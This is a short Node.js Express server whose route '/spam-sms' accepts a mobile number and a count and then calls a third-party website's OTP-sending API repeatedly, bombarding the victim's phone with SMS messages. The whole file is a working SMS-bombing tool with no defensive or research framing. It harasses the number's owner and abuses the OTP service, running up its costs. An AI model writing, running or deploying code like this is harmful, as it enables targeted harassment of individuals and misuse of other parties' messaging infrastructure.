const axios = require('axios');
const qs = require('qs'); // Query string parser to format form 
const express = require('express');
const cors = require('cors');
const app = express();

app.use(express.json());
app.use(cors());

const spamSms = async (mobile, smsCount) => {
  let successCount = 0;
  let failureCount = 0;
  const url = 'https://ekbaarphirsemodisarkar.com/api/v1/user/send_otp_mobile?language=en';
  
  const payload = {
      mobile: mobile
  };

  for (let index = 0; index < smsCount; index++) {
    try {
      const response = await axios.patch(url, qs.stringify(payload), {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        }
      });
      console.log('Response:', response.data, mobile, index);
      successCount++;
    } catch (error) {
      console.error('Error:', error);
      failureCount++;
    }
  }
  return { successCount, failureCount };
};

app.post('/spam-sms', async (req, res) => {
  const { successCount, failureCount } = await spamSms(req.body.mobile, req.body.smsCount);
  res.send({ successCount, failureCount });
})

app.listen(3000, () => {
  console.log('Server is running on port 3000');
})  

